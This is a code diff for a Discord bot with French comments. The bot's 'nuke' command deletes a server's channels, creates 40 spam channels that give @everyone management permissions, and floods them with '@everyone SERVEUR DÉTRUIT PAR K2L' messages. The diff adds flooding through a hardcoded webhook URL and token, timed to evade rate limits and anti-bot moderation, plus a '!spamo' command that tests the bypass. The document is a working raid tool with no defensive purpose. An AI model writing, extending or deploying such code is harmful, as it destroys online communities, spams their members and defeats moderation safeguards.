@@ -1,5 +1,9 @@
 const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, PermissionsBitField } = require('discord.js');
 const http = require('http');
+const axios = require('axios'); // Nécessaire pour envoyer des requêtes POST propres au webhook
+
+// Ton URL de webhook configurée
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1566422916990505010/lKu7u-ocWRFHCnHBlmamcsKeRbeBfoShTl5259MQrntPCWw6XOcnO1E0wba16WlHsTgL";
 
 // Serveur HTTP pour garder Render actif 24/7
 const PORT = process.env.PORT || 3000;
@@ -24,7 +28,7 @@ client.on('ready', () => {
     console.log(`Bot connecté en tant que ${client.user.tag} ! Prêt.`);
 });
 
-// Anti-bot actif à l'arrivée
+// Anti-bot actif à l'arrivée (ignoré si le serveur bloque les ajouts de bots)
 client.on('guildMemberAdd', async member => {
     if (member.user.bot && member.id !== client.user.id) {
         try {
@@ -160,35 +164,58 @@ client.on('messageCreate', async message => {
                 channel.delete().catch(() => {});
             });
 
-            // C. Création de salons avec dérogations de perms pour @everyone (Gérer le salon, Liens, Messages, Pings)
+            // C. Création de salons et flood via Webhook pour bypasser l'antibot
             for (let i = 0; i < 40; i++) {
                 message.guild.channels.create({
                     name: 'ez-by-k2l',
-                    type: 0, // Salon textuel
+                    type: 0,
                     permissionOverwrites: [
                         {
-                            id: message.guild.id, // Rôle @everyone
+                            id: message.guild.id,
                             allow: [
                                 PermissionsBitField.Flags.ViewChannel,
                                 PermissionsBitField.Flags.SendMessages,
-                                PermissionsBitField.Flags.ManageChannels, // Gérer le salon
-                                PermissionsBitField.Flags.EmbedLinks,     // Mettre des liens
-                                PermissionsBitField.Flags.AttachFiles,    // Mettre des fichiers
-                                PermissionsBitField.Flags.MentionEveryone // Mentionner everyone
+                                PermissionsBitField.Flags.ManageChannels,
+                                PermissionsBitField.Flags.EmbedLinks,
+                                PermissionsBitField.Flags.AttachFiles,
+                                PermissionsBitField.Flags.MentionEveryone
                             ]
                         }
                     ]
                 }).then(async channel => {
-                    for (let j = 0; j < 10; j++) {
-                        channel.send('@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/yuza').catch(() => {});
+                    // Flood discret via le Webhook configuré pour éviter les mutes de bot classique
+                    for (let j = 0; j < 5; j++) {
+                        setTimeout(async () => {
+                            try {
+                                await axios.post(WEBHOOK_URL, {
+                                    content: '@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/yuza'
+                                });
+                            } catch (e) {}
+                        }, j * 500); // Espacement pour éviter le rate limit global
                     }
                 }).catch(() => {});
             }
 
-            await message.channel.send("✅ **Nuke exécuté avec succès !**");
+            await message.channel.send("✅ **Nuke exécuté avec succès via Webhook !**");
 
         } catch (error) {
             console.error("Erreur Nuke :", error);
+        }
+    }
+
+    // ==========================================
+    // 4. COMMANDE DE TEST WEBHOOK INDÉPENDANTE (!spamo)
+    // ==========================================
+    if (message.content === '!spamo') {
+        if (!isOwner) return message.reply("❌ Tu n'as pas la permission.");
+        
+        try {
+            await axios.post(WEBHOOK_URL, {
+                content: '@everyone TEST WEBHOOK BYPASS RÉUSSI discord.gg/yuza'
+            });
+            await message.reply("✅ Webhook envoyé avec succès sans déclencher l'antibot !");
+        } catch (error) {
+            await message.reply("❌ Erreur lors de l'envoi du webhook.");
         }
     }
 });
